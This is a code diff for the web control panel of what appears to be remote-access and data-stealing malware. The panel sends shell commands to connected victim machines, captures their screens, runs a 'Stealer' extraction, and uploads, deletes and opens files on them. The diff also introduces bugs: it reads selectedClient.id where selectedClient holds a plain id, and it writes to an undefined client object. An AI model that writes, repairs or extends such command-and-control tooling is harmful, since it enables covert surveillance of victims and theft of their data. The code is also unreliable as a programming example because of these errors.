@@ -727,6 +727,9 @@
     
     // Initialize UI
     function initUI() {
+      document.getElementById("clientList").onchange = function () {
+        selectedClient = this.value;
+      };
       loadClients();
       showTab('cmd');
       updateUptime();
@@ -773,24 +776,26 @@
         .then(data => {
           const list = document.getElementById("clientList");
           list.innerHTML = "";
-          data.forEach(id => {
+
+          data.forEach(client => {
             const opt = document.createElement("option");
-            opt.value = id;
-            opt.textContent = id;
+            opt.value = client.id;
+            opt.textContent = client.name || `${client.ip}`;
             list.appendChild(opt);
           });
-          
-          if (data.length) {
-            selectedClient = data[0];
-            document.getElementById("activeClients").textContent = data.length;
+
+          if (data.length && !selectedClient) {
+            selectedClient = data[0].id;
           }
-          
+
+          document.getElementById("activeClients").textContent = data.length;
           output.value += `[System] ${data.length} clients connected\n`;
         })
         .catch(() => {
           output.value += `[System] Error loading clients\n`;
         });
     }
+
     
     // Show tab
     function showTab(tab) {
@@ -821,7 +826,7 @@
       const cmd = document.getElementById("cmdInput").value;
       if (!selectedClient || !cmd) return;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "cmd", data: cmd })
@@ -844,7 +849,7 @@
       const status = document.getElementById("stealerStatus");
       status.textContent = `[Screen] Starting screen capture for ${selectedClient}...`;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "start_screen", data: "" })
@@ -857,7 +862,7 @@
       const status = document.getElementById("stealerStatus");
       status.textContent += `\n[Screen] Stopping capture...`;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "stop_screen", data: "" })
@@ -869,7 +874,7 @@
       const status = document.getElementById("stealerStatus");
       status.textContent = `[Stealer] Starting data extraction from ${selectedClient}...`;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -907,7 +912,7 @@
     function sendLs(path) {
       if (!selectedClient) return;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "ls", data: path })
@@ -1007,7 +1012,7 @@
 
         progress.value = 0;
 
-        fetch(`/send/${selectedClient}`, {
+        fetch(`/send/${selectedClient.id}`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ type: "upload", data: JSON.stringify(payload) })
@@ -1054,7 +1059,7 @@
       const status = document.getElementById("stealerStatus");
       status.textContent = `[File] Deleting ${rightClickedPath}...`;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "rm", data: rightClickedPath })
@@ -1071,7 +1076,7 @@
       const status = document.getElementById("stealerStatus");
       status.textContent = `[File] Opening ${rightClickedPath}...`;
       
-      fetch(`/send/${selectedClient}`, {
+      fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "open", data: rightClickedPath })
@@ -1093,8 +1098,8 @@
     }
     
     // WebSocket for real-time updates
-    const ws = new WebSocket(`wss://${location.host}/admin`);
-    ws.onmessage = (event) => {
+    const wss = new WebSocket(`wss://${location.host}/admin`);
+    wss.onmessage = (event) => {
       const msg = JSON.parse(event.data);
       if (msg.type === "screen") {
         document.getElementById("screenshot").src = "data:image/jpeg;base64," + msg.data;
@@ -1106,6 +1111,8 @@
       } else if (msg.type === "stealer") {
         document.getElementById("stealerData").textContent = msg.data;
         downloadBtn.style.display = 'block';
+      } else if (msg.type == "hello"){
+        client.Username = msg.Data
       }
     };
     
